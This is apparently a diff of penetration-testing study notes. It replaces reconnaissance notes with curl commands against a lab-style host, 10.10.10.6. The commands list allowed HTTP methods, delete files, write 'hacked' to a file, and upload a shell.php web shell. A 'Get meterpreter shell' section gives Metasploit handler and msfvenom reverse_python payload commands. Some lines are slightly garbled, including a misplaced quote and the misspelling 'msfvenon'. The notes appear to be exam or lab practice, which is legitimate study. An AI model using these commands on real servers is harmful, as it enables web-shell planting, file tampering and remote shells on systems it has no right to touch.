@@ -1,11 +1,22 @@
-Fingerprint webserver
+HTTP METHODS
+GET
+POST
+OPTIONS
+DELETE
+PUT
 
-whatweb 192.168.174.160
-wappalyzer extension firefox
-testphp.vulnweb.com
+Display all methods permitted on a website 
+curl -v -X OPTIONS http://10.10.10.6/ve
 
-theHarvestor
-https://github.com/laramies/theHarvester
-python theHarvestor.py  -d eccouncil -l 200 -b yahoo
+curl -X DELETE http://10.10.10.6/1.txt
 
+curl -X PUT -d 'hacked 'http://10.10.10.6/file.txt
+curl -X PUT --upload-file shell.php http://10.10.10.6/shell.php
+curl -X DELETE http://10.10.10.6/shell.php
+
+Get meterpreter shell
+msfconsole && listen use exploit/multi/handler
+set payload cmd/unix/reverse_python
+lhost && lport
+msfvenon -p cmd/unix/reverse_python LPORT= LHOST=
 
